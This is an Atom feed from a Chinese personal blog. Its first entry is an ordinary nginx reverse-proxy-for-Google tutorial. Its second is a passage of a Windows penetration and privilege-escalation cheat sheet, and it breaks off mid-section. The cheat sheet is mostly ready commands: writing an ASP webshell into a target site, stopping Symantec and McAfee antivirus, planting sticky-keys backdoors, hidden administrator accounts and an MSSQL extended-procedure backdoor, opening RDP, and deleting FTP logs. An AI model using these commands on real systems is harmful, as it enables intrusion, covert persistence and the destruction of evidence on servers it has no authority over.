<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[sqzr's blog]]></title>
  <subtitle><![CDATA[记录学习过程中的点点滴滴]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="https://sqzr.cc/"/>
  <updated>2014-11-04T07:33:16.661Z</updated>
  <id>https://sqzr.cc/</id>
  
  <author>
    <name><![CDATA[sqzr]]></name>
    <email><![CDATA[monkeysqzr@gmail.com]]></email>
  </author>
  
  <generator uri="http://zespia.tw/hexo/">Hexo</generator>
  
  <entry>
    <title><![CDATA[nginx 反向代理谷歌]]></title>
    <link href="https://sqzr.cc//blog/2014/11/02/nginx-reverse-proxy-google/"/>
    <id>https://sqzr.cc//blog/2014/11/02/nginx-reverse-proxy-google/</id>
    <published>2014-11-02T11:56:03.000Z</published>
    <updated>2014-11-02T13:03:39.000Z</updated>
    <content type="html"><![CDATA[<p>已经有不少人做了类似的站点,大部分都没处理好几个问题..比如谷歌的一些图片和js放在<code>ssl.gstatic.com</code>这个域名上,虽然没加载出来也不会对搜索有什么影响,但看着chrome一直转圈,非常不爽。<br>一个处理的比较好的网站<a href="http://wen.lu/" target="_blank" rel="external">wen.lu</a>,不管是速度还是各方面都比较好.. 但缺点就是人用的比较多,偶尔会出现要输验证码的情况,花了一天的时间,自己折腾了下反向代理谷歌。</p>
<h2 id="nginx安装">nginx安装</h2>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">cd /tmp</div><div class="line">git clone git://github.com/yaoweibin/ngx_http_substitutions_filter_module.git # nginx 的过滤器模块(比http_sub_module更加灵活)</div><div class="line">wget http://nginx.org/download/nginx-1.7.7.tar.gz</div><div class="line">tar -xzvf nginx-1.7.7.tar.gz</div><div class="line">cd /tmp/nginx-1.7.7</div><div class="line">./configure \</div><div class="line">-<span class="ruby">-prefix=<span class="regexp">/www/wdlinux</span><span class="regexp">/nginx \ # 安装位置</span></span></div><div class="line">-<span class="ruby">-with-http_ssl_module \</span></div><div class="line">-<span class="ruby">-with-http_sub_module \</span></div><div class="line">-<span class="ruby">-with-http_gzip_static_module \</span></div><div class="line">-<span class="ruby">-with-http_stub_status_module \</span></div><div class="line">-<span class="ruby">-add-<span class="class"><span class="keyword">module</span>=/<span class="title">tmp</span>/<span class="title">ngx_http_substitutions_filter_module</span> <span class="comment"># 添加nginx过滤器模块</span></span></span></div><div class="line">make & make install</div></pre></td></tr></table></figure>

<p>安装上面的步骤安装好nginx,如果中途遇到什么报错,请google。<br><a id="more"></a></p>
<hr>
<h2 id="配置反向代理">配置反向代理</h2>
<h3 id="配置文件">配置文件</h3>
<p>直接上配置文件:  </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="title">server</span> {</div><div class="line">    <span class="title">listen</span> <span class="number">443</span>;</div><div class="line">    <span class="title">server_name</span> sqzr.cc;</div><div class="line">    <span class="title">ssl</span> <span class="built_in">on</span>;</div><div class="line">    <span class="title">ssl_certificate</span> xxx.crt; <span class="comment"># crt 位置</span></div><div class="line">    <span class="title">ssl_certificate_key</span> xxx.key; <span class="comment"># key 位置</span></div><div class="line"></div><div class="line">    <span class="title">location</span> / {</div><div class="line">        <span class="comment"># 反向代理缓存配置</span></div><div class="line">        <span class="title">proxy_cache_key</span> <span class="variable">$scheme</span>://<span class="variable">$host</span><span class="variable">$request_uri</span>;</div><div class="line">        <span class="title">proxy_temp_path</span> /home/sqzrproxy_cache_tmp;</div><div class="line">        <span class="title">proxy_cache_path</span> /home/sqzrproxy_cache levels=<span class="number">1</span>:<span class="number">2</span> keys_zone=sqzrproxy:<span class="number">20m</span> inactive=<span class="number">10d</span> max_size=<span class="number">2g</span>;</div><div class="line">        <span class="title">proxy_cache</span> sqzrproxy;</div><div class="line">        <span class="title">proxy_cache_valid</span> <span class="number">200</span> <span class="number">302</span> <span class="number">24h</span>;</div><div class="line">        <span class="title">proxy_cache_valid</span> <span class="number">404</span> <span class="number">1m</span>;</div><div class="line">        <span class="comment"># end 反向代理缓存配置</span></div><div class="line">        <span class="title">expires</span> <span class="number">30d</span>;   <span class="comment"># 用户游览器缓存时间</span></div><div class="line">        <span class="title">proxy_redirect</span> <span class="url">https://www.google.com/</span> /;</div><div class="line">        <span class="title">proxy_cookie_domain</span> google.com sqzr.cc;</div><div class="line">        <span class="title">proxy_pass</span> <span class="url">http://173.194.38.69</span>; <span class="comment"># 反代的google一个ip</span></div><div class="line">        <span class="title">proxy_set_header</span> Accept-Encoding <span class="string">""</span>;</div><div class="line">        <span class="title">proxy_set_header</span> User-Agent <span class="variable">$http_user_agent</span>;</div><div class="line">        <span class="title">proxy_set_header</span> Accept-Language <span class="string">"zh-CN"</span>;</div><div class="line">        <span class="comment">#proxy_set_header Cookie "PREF=ID=047808f19f6de346:U=0f62f33dd8549d11:FF=2:LD=zh-CN:NW=1:TM=1325338577:LM=1332142444:GM=1:SG=2:S=rE0SyJh2w1IQ-Maw"; # 使用此cookie 谷歌在搜索结果打开的时候会弹出新窗口</span></div><div class="line">        <span class="title">proxy_set_header</span> Cookie <span class="string">"PREF=ID=a55d9a4143345dbb:FF=0:TM=1414914150:LM=1414914150:S=Sm6aRXOASTr7rVM9;NID=67=lFnfhba9BOH4rXNaxA0ieI_XSHv3Mqu9scHN-Byu5sgdy2DAtb_SfC8XVYJAtREoKDJk3M54tGBZK1cCM0TGkJ_yM7Eqrxk2GVGnxJ87V1yUIIRs4ZFAmh2xlIHn1pug;"</span>; <span class="comment"># 使用此cookie 搜索的时候谷歌用ajax加载结果(无刷新页面) 谷歌在搜索结果打开的时候不会弹出新窗口</span></div><div class="line">        <span class="comment"># 关键字替换</span></div><div class="line">        <span class="title">subs_filter_types</span> text/css text/xml text/javascript; <span class="comment"># 过滤类型</span></div><div class="line">        <span class="title">subs_filter</span> ssl.gstatic.com sqzr.cc; <span class="comment"># google会加载ssl.gstatic.com的几个资源和文件,都是在gb目录下,下面反代这个地址</span></div><div class="line">        <span class="title">subs_filter</span> www.google.com sqzr.cc;</div><div class="line">        <span class="comment"># end 关键字替换</span></div><div class="line">    }</div><div class="line">    </div><div class="line">    <span class="comment"># 反代ssl.gstatic.com</span></div><div class="line">    <span class="title">location</span> /gb {</div><div class="line">        <span class="comment"># 随便写了下,自己没使用自己的服务器来反代</span></div><div class="line">        <span class="title">proxy_pass</span> <span class="url">http://ssl.gstatic.com/gb/</span>;</div><div class="line">        <span class="title">proxy_set_header</span> Accept-Encoding <span class="string">""</span>;</div><div class="line">    }</div><div class="line">}</div><div class="line"></div><div class="line"><span class="title">server</span> {</div><div class="line">    <span class="title">listen</span> <span class="number">80</span>;</div><div class="line">    <span class="title">server_name</span> sqzr.cc;</div><div class="line">    <span class="title">rewrite</span><span class="regexp"> ^(.*)</span> <span class="url">https://google.sqzr.cc$1</span> <span class="built_in">permanent</span>; <span class="comment"># 强制使用https</span></div><div class="line">}</div></pre></td></tr></table></figure>

<h3 id="使用七牛云代替gstatic">使用七牛云代替gstatic</h3>
<p>能不反代的地址尽量不要反代,比如一些常年不变的图片,可以直接就缓存到服务器上。<br><code>ssl.gstatic.com</code>域上的几个资源就这样,可以用七牛云提供的镜像功能来缓存到七牛云上。<br><img src="//dn-sqzr.qbox.me/七牛云设置镜像.png" alt="设置镜像站点"><br>默认七牛给的域名不支持https,绑定一个他们分配的：<br><img src="//dn-sqzr.qbox.me/绑定支持https的域名.png" alt="绑定支持https的域名"><br>修改nginx中的关键词替换:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">subs_filter ssl.gstatic.<span class="keyword">com</span> dn-xxx.qbox.<span class="keyword">me</span>;</div></pre></td></tr></table></figure>

<p>访问一次,就自动缓存到七牛云的服务器上了:<br><img src="//dn-sqzr.qbox.me/缓存结果.png" alt="缓存结果"></p>
<h3 id="一些细节问题">一些细节问题</h3>
<ol>
<li>在网上看到很多人说无法成功的替换<code>ssl.gstatic.com</code>这个域名,之前我也遇到过,折腾了一天才发现<code>proxy_pass http://173.194.38.69</code> 某些地址可以修改成功,有些不可以(不知道原因,希望懂的能指导指导)  </li>
<li>google.com下的<code>/textinputassistant/tia.png</code>无法替换,也和上个问题一样,有些ip可以有些不行</li>
</ol>
<hr>
<h2 id="没解决的问题">没解决的问题</h2>
<p>这样反代下来还是有几个问题没解决,如果使用第一个cookie反代google(用新页面打开搜索结果),搜索不了几次就会出现:<br><img src="//dn-sqzr.qbox.me/google反代提示.png" alt="google反代提示"><br>使用无刷新搜索的那个cookie就不会出来(因为整体页面没刷新,没加载,如果在里面切换到图片搜索再切换回来,一样会出现)<br>希望各位大神能指导指导</p>
<h2 id="参考资料">参考资料</h2>
<ul>
<li><a href="http://www.v2ex.com/t/126028" target="_blank" rel="external">分享一下我的 Nginx 反向代理 Google 以及草榴等的参数配置</a></li>
<li><a href="http://blog.linuxeye.com/399.html" target="_blank" rel="external">Nginx反向代理Google</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>已经有不少人做了类似的站点,大部分都没处理好几个问题..比如谷歌的一些图片和js放在<code>ssl.gstatic.com</code>这个域名上,虽然没加载出来也不会对搜索有什么影响,但看着chrome一直转圈,非常不爽。<br>一个处理的比较好的网站<a href="http://wen.lu/" target="_blank" rel="external">wen.lu</a>,不管是速度还是各方面都比较好.. 但缺点就是人用的比较多,偶尔会出现要输验证码的情况,花了一天的时间,自己折腾了下反向代理谷歌。</p>
<h2 id="nginx安装">nginx安装</h2>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">cd /tmp</div><div class="line">git clone git://github.com/yaoweibin/ngx_http_substitutions_filter_module.git # nginx 的过滤器模块(比http_sub_module更加灵活)</div><div class="line">wget http://nginx.org/download/nginx-1.7.7.tar.gz</div><div class="line">tar -xzvf nginx-1.7.7.tar.gz</div><div class="line">cd /tmp/nginx-1.7.7</div><div class="line">./configure \</div><div class="line">-<span class="ruby">-prefix=<span class="regexp">/www/wdlinux</span><span class="regexp">/nginx \ # 安装位置</span></span></div><div class="line">-<span class="ruby">-with-http_ssl_module \</span></div><div class="line">-<span class="ruby">-with-http_sub_module \</span></div><div class="line">-<span class="ruby">-with-http_gzip_static_module \</span></div><div class="line">-<span class="ruby">-with-http_stub_status_module \</span></div><div class="line">-<span class="ruby">-add-<span class="class"><span class="keyword">module</span>=/<span class="title">tmp</span>/<span class="title">ngx_http_substitutions_filter_module</span> <span class="comment"># 添加nginx过滤器模块</span></span></span></div><div class="line">make & make install</div></pre></td></tr></table></figure>

<p>安装上面的步骤安装好nginx,如果中途遇到什么报错,请google。<br>]]>
    
    </summary>
    
      <category term="nginx" scheme="https://sqzr.cc/tags/nginx/"/>
    
      <category term="折腾" scheme="https://sqzr.cc/categories/%E6%8A%98%E8%85%BE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Windows渗透与提权技巧汇总]]></title>
    <link href="https://sqzr.cc//blog/2014/08/20/windows-penetration-and-provide-the-right-skills-summary/"/>
    <id>https://sqzr.cc//blog/2014/08/20/windows-penetration-and-provide-the-right-skills-summary/</id>
    <published>2014-08-20T04:59:00.000Z</published>
    <updated>2014-10-30T11:43:41.000Z</updated>
    <content type="html"><![CDATA[<h2 id="旁站路径问题">旁站路径问题</h2>
<p>1、读网站配置。<br>2、用以下VBS：  </p>
<figure class="highlight vbs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span> </div><div class="line"><span class="keyword">If</span> (<span class="built_in">LCase</span>(<span class="built_in">Right</span>(WScript.Fullname, <span class="number">11</span>)) = <span class="string">"wscript.exe"</span>) <span class="keyword">Then</span> </div><div class="line"><span class="built_in">MsgBox</span> <span class="built_in">Space</span>(<span class="number">12</span>) & <span class="string">"IIS Virtual Web Viewer"</span> & <span class="built_in">Space</span>(<span class="number">12</span>) & <span class="built_in">Chr</span>(<span class="number">13</span>) & <span class="built_in">Space</span>(<span class="number">9</span>) & <span class="string">" Usage:Cscript vWeb.vbs"</span>, <span class="number">4096</span>, <span class="string">"Lilo"</span> </div><div class="line">WScript.Quit </div><div class="line"><span class="keyword">End</span> <span class="keyword">If</span> </div><div class="line"><span class="keyword">Set</span> objservice = <span class="built_in">GetObject</span>(<span class="string">"IIS://LocalHost/W3SVC"</span>) </div><div class="line"><span class="keyword">For</span> <span class="keyword">Each</span> obj3w <span class="keyword">In</span> objservice </div><div class="line"><span class="keyword">If</span> IsNumeric(obj3w.Name) <span class="keyword">Then</span> </div><div class="line"><span class="keyword">Set</span> OService = <span class="built_in">GetObject</span>(<span class="string">"IIS://LocalHost/W3SVC/"</span> & obj3w.Name) </div><div class="line"><span class="keyword">Set</span> VDirObj = OService.<span class="built_in">GetObject</span>(<span class="string">"IIsWebVirtualDir"</span>, <span class="string">"ROOT"</span>) </div><div class="line"><span class="keyword">If</span> <span class="built_in">Err</span> &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span> WScript.Quit (<span class="number">1</span>) </div><div class="line">WScript.Echo <span class="built_in">Chr</span>(<span class="number">10</span>) & <span class="string">"["</span> & OService.ServerComment & <span class="string">"]"</span> </div><div class="line"><span class="keyword">For</span> <span class="keyword">Each</span> Binds <span class="keyword">In</span> OService.ServerBindings </div><div class="line">Web = <span class="string">"{ "</span> & <span class="built_in">Replace</span>(Binds, <span class="string">":"</span>, <span class="string">" } { "</span>) & <span class="string">" }"</span> </div><div class="line">WScript.Echo <span class="built_in">Replace</span>(<span class="built_in">Split</span>(<span class="built_in">Replace</span>(Web, <span class="string">" "</span>, <span class="string">""</span>), <span class="string">"}{"</span>)(<span class="number">2</span>), <span class="string">"}"</span>, <span class="string">""</span>) </div><div class="line"><span class="keyword">Next</span> </div><div class="line">WScript.Echo <span class="string">"Path            : "</span> & VDirObj.Path </div><div class="line"><span class="keyword">End</span> <span class="keyword">If</span> </div><div class="line"><span class="keyword">Next</span></div></pre></td></tr></table></figure>

<p>3、iis_spy 列举(注：需要支持ASPX，反IISSPY的方法：将 activeds.dll，activeds.tlb 降权)。<br>4、得到目标站目录，不能直接跨的。可以通过“echo ^&lt;%execute(request(“cmd”))%^&gt; &gt;&gt;X:\目标目录\X.asp”或者“copy 脚本文件 X:\目标目录\X.asp”像目标目录写入webshell，或者还可以试试type命令。<br><a id="more"></a></p>
<hr>
<h2 id="CMD_下操作_VPN_相关知识、资料">CMD 下操作 VPN 相关知识、资料</h2>
<p>允许administrator拨入该VPN：  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh ras <span class="operator"><span class="keyword">set</span> <span class="keyword">user</span> administrator permit</span></div></pre></td></tr></table></figure>

<p>禁止administrator拨入该VPN：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh ras <span class="operator"><span class="keyword">set</span> <span class="keyword">user</span> administrator deny</span></div></pre></td></tr></table></figure>

<p>查看哪些用户可以拨入VPN：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh ras <span class="literal">show</span> <span class="literal">user</span></div></pre></td></tr></table></figure>

<p>查看VPN分配IP的方式：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh ras ip <span class="literal">show</span> config</div></pre></td></tr></table></figure>

<p>使用地址池的方式分配IP：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh ras ip <span class="type">set</span> addrassign <span class="keyword">method</span> = pool</div></pre></td></tr></table></figure>

<p>地址池的范围是从192.168.3.1到192.168.3.254：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh ras ip <span class="built_in">add</span> <span class="built_in">range</span> from = <span class="number">192.168</span>.<span class="number">3.1</span> <span class="keyword">to</span> = <span class="number">192.168</span>.<span class="number">3.254</span></div></pre></td></tr></table></figure>

<hr>
<h2 id="Cmd、Dos_命令行下添加_SQL_用户的方法">Cmd、Dos 命令行下添加 SQL 用户的方法</h2>
<p>需要有管理员权限，在命令下先建立一个<code>c:\test.qry</code>文件，内容如下：  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">exec master.dbo.sp_addlogin test,123</div><div class="line">EXEC sp_addsrvrolemember 'test, 'sysadmin'</div></pre></td></tr></table></figure>

<p>然后在DOS下执行：<code>cmd.exe /c isql -E /U alma /P /i c:\test.qry</code>  </p>
<hr>
<h2 id="另类的加用户方法">另类的加用户方法</h2>
<p>在删掉了 net.exe 和不用 adsi 之外，新的加用户的方法。代码如下：  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">var <span class="keyword">o</span>=<span class="keyword">new</span> ActiveXObject( <span class="string">"Shell.Users"</span> ); </div><div class="line"><span class="keyword">z</span>=<span class="keyword">o</span>.create(<span class="string">"test"</span>) ; </div><div class="line"><span class="keyword">z</span>.changePassword(<span class="string">"123456"</span>,<span class="string">""</span>) </div><div class="line"><span class="keyword">z</span>.setting(<span class="string">"AccountType"</span>)=<span class="number">3</span>; </div><div class="line">vb<span class="variable">s:</span> </div><div class="line"><span class="keyword">view</span> <span class="keyword">source</span> </div><div class="line">Set <span class="keyword">o</span>=CreateObject( <span class="string">"Shell.Users"</span> ) </div><div class="line">Set <span class="keyword">z</span>=<span class="keyword">o</span>.create(<span class="string">"test"</span>) </div><div class="line"><span class="keyword">z</span>.changePassword <span class="string">"123456"</span>,<span class="string">""</span> </div><div class="line"><span class="keyword">z</span>.setting(<span class="string">"AccountType"</span>)=<span class="number">3</span></div></pre></td></tr></table></figure>

<hr>
<h2 id="Cmd_访问控制权限控制">Cmd 访问控制权限控制</h2>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cacls <span class="attribute">c</span>: <span class="regexp">/e /t /g</span> <span class="attribute">everyone</span>:F           <span class="comment">#c盘everyone权限 </span></div><div class="line">cacls <span class="string">"目录"</span> /d everyone               <span class="comment">#everyone不可读，包括admin</span></div></pre></td></tr></table></figure>

<p>备注：<br>反制方法，在文件夹安全设置里将 Everyone 设定为不可读，如果没有安全性选项：工具 – 文件夹选项 – 使用简单的共享去掉即可。  </p>
<hr>
<h2 id="3389_相关，以下配合PR更好">3389 相关，以下配合PR更好</h2>
<ul><br><li>防火墙TCP/IP筛选.(关闭：net stop policyagent &amp; net stop sharedaccess)</li><br><li>内网环境(lcx.exe)</li><br><li>终端服务器超出了最大允许连接(XP 运行：mstsc /admin;2003 运行：mstsc /console)</li><br></ul>

<p>开启XP&amp;2003终端服务：  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">REG ADD HKLM<span class="command">\SYSTEM</span><span class="command">\CurrentControlSet</span><span class="command">\Control</span><span class="command">\Terminal</span>" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</div></pre></td></tr></table></figure>

<p>更改终端端口为2008(十六进制为：0x7d8)：  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">REG ADD HKLM<span class="command">\SYSTEM</span><span class="command">\CurrentControlSet</span><span class="command">\Control</span><span class="command">\Terminal</span>" "Server<span class="command">\Wds</span><span class="command">\rdpwd</span><span class="command">\Tds</span><span class="command">\tcp</span> /v PortNumber /t REG_DWORD /d 0x7d8 /f</div><div class="line">REG ADD HKLM<span class="command">\SYSTEM</span><span class="command">\CurrentControlSet</span><span class="command">\Control</span><span class="command">\Terminal</span>" "Server<span class="command">\WinStations</span><span class="command">\RDP</span>-Tcp /v PortNumber /t REG_DWORD /d 0x7D8 /f</div></pre></td></tr></table></figure>

<p>.取消xp&amp;2003系统防火墙对终端服务的限制及IP连接的限制：  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">REG ADD HKLM<span class="command">\SYSTEM</span><span class="command">\CurrentControlSet</span><span class="command">\Services</span><span class="command">\SharedAccess</span><span class="command">\Parameters</span><span class="command">\FirewallPolicy</span><span class="command">\StandardProfile</span><span class="command">\GloballyOpenPorts</span><span class="command">\List</span> /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled :@ xpsp2res.dll,-22009 /f</div></pre></td></tr></table></figure>

<hr>
<h2 id="关闭常见杀软(把杀软所在的文件的所有权限去掉)">关闭常见杀软(把杀软所在的文件的所有权限去掉)</h2>
<p>处理变态诺顿企业版：  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">net <span class="keyword">stop</span> <span class="string">"Symantec AntiVirus"</span> /<span class="keyword">y</span> </div><div class="line">net <span class="keyword">stop</span> <span class="string">"Symantec AntiVirus Definition Watcher"</span> /<span class="keyword">y</span> </div><div class="line">net <span class="keyword">stop</span> <span class="string">"Symantec Event Manager"</span> /<span class="keyword">y</span> </div><div class="line">net <span class="keyword">stop</span> <span class="string">"System Event Notification"</span> /<span class="keyword">y</span> </div><div class="line">net <span class="keyword">stop</span> <span class="string">"Symantec Settings Manager"</span> /<span class="keyword">y</span></div></pre></td></tr></table></figure>

<p>麦咖啡：  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net <span class="keyword">stop</span> <span class="string">"McAfee McShield"</span></div></pre></td></tr></table></figure>

<p>Symantec病毒日志:  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">C:<span class="command">\Documents</span> and Settings<span class="command">\All</span> Users<span class="command">\Application</span> Data<span class="command">\Symantec</span><span class="command">\Symantec</span> Endpoint Protection<span class="command">\Logs</span></div></pre></td></tr></table></figure>

<p>Symantec病毒备份:  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">C:<span class="command">\Documents</span> and Settings<span class="command">\All</span> Users<span class="command">\Application</span> Data<span class="command">\Symantec</span><span class="command">\Symantec</span> Endpoint Protection<span class="command">\Quarantine</span></div></pre></td></tr></table></figure>

<p>Nod32病毒备份:  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">C:<span class="command">\Docume</span><span class="special">~</span>1<span class="command">\Administrator</span><span class="command">\Local</span> Settings<span class="command">\Application</span> Data<span class="command">\ESET</span><span class="command">\ESET</span> NOD32 Antivirus<span class="command">\Quarantine</span></div></pre></td></tr></table></figure>

<p>Nod32移除密码保护:  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">删除“HKEY_LOCAL_MACHINE<span class="command">\SOFTWARE</span><span class="command">\ESET</span><span class="command">\ESET</span> Security<span class="command">\CurrentVersion</span><span class="command">\Info</span><span class="command">\PackageID</span>”即可</div></pre></td></tr></table></figure>

<hr>
<h2 id="安装5次shift后门，沾滞键后门，替换SHIFT后门">安装5次shift后门，沾滞键后门，替换SHIFT后门</h2>
<p>5次SHIFT，沾滞键后门：  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">copy <span class="variable">%systemroot</span><span class="variable">%\</span>system32\sethc.exe <span class="variable">%systemroot</span><span class="variable">%\</span>system32\dllcache\sethc1.exe </div><div class="line">copy <span class="variable">%systemroot</span><span class="variable">%\</span>system32\cmd.exe <span class="variable">%systemroot</span><span class="variable">%\</span>system32\dllcache\sethc.exe /y </div><div class="line">copy <span class="variable">%systemroot</span><span class="variable">%\</span>system32\cmd.exe <span class="variable">%systemroot</span><span class="variable">%\</span>system32\sethc.exe /y</div></pre></td></tr></table></figure>

<p>替换SHIFT后门：  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">attrib c:<span class="command">\windows</span><span class="command">\system</span>32<span class="command">\sethc</span>.exe -h -r -s </div><div class="line">attrib c:<span class="command">\windows</span><span class="command">\system</span>32<span class="command">\dllcache</span><span class="command">\sethc</span>.exe -h -r -s </div><div class="line">del c:<span class="command">\windows</span><span class="command">\system</span>32<span class="command">\sethc</span>.exe </div><div class="line">copy c:<span class="command">\windows</span><span class="command">\explorer</span>.exe c:<span class="command">\windows</span><span class="command">\system</span>32<span class="command">\sethc</span>.exe </div><div class="line">copy c:<span class="command">\windows</span><span class="command">\system</span>32<span class="command">\sethc</span>.exe c:<span class="command">\windows</span><span class="command">\system</span>32<span class="command">\dllcache</span><span class="command">\sethc</span>.exe </div><div class="line">attrib c:<span class="command">\windows</span><span class="command">\system</span>32<span class="command">\sethc</span>.exe +h +r +s </div><div class="line">attrib c:<span class="command">\windows</span><span class="command">\system</span>32<span class="command">\dllcache</span><span class="command">\sethc</span>.exe +h +r +s</div></pre></td></tr></table></figure>

<p>添加隐藏系统账号：  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>、执行命令：“net <span class="literal">user</span> <span class="literal">admin</span>$ <span class="number">123456</span> /add&net localgroup administrators <span class="literal">admin</span>$ /add”。</div><div class="line"><span class="number">2</span>、导出注册表SAM下用户的两个键值。</div><div class="line"><span class="number">3</span>、在用户管理界面里的 <span class="literal">admin</span>$ 删除，然后把备份的注册表导回去。</div><div class="line"><span class="number">4</span>、利用 Hacker Defender 把相关用户注册表隐藏。</div></pre></td></tr></table></figure>

<p>安装 MSSQL 扩展后门：  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">USE</span> <span class="keyword">master</span>;</span> </div><div class="line">EXEC sp_addextendedproc 'xp_helpsystem', 'xp_helpsystem.dll'; </div><div class="line"><span class="operator"><span class="keyword">GRANT</span> <span class="keyword">exec</span> <span class="keyword">On</span> xp_helpsystem <span class="keyword">TO</span> <span class="keyword">public</span>;</span></div></pre></td></tr></table></figure>

<p>处理服务器MSFTP日志：  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">在“C:\WINNT\system32\LogFiles\MSFTPSVC1\”下有 ex011120.<span class="built_in">log</span> / ex011121.<span class="built_in">log</span> / ex011124.<span class="built_in">log</span> 三个文件，直接删除 ex0111124.<span class="built_in">log</span> 不成功，显示“原文件…正在使用”。</div><div class="line">当然可以直接删除“ex011120.<span class="built_in">log</span> / ex011121.<span class="built_in">log</span>”。然后用记事本打开“ex0111124.<span class="built_in">log</span>”，删除里面的一些内容后，保存，覆盖退出，成功。</div><div class="line">当停止“msftpsvc”服务后可直接删除“ex011124.<span class="built_in">log</span>”。</div></pre></td></tr></table></figure>

<hr>
<h2 id="MSSQL查询分析器连接记录清除">MSSQL查询分析器连接记录清除</h2>
<p>MSSQL 2000 位于注册表如下:  </p>
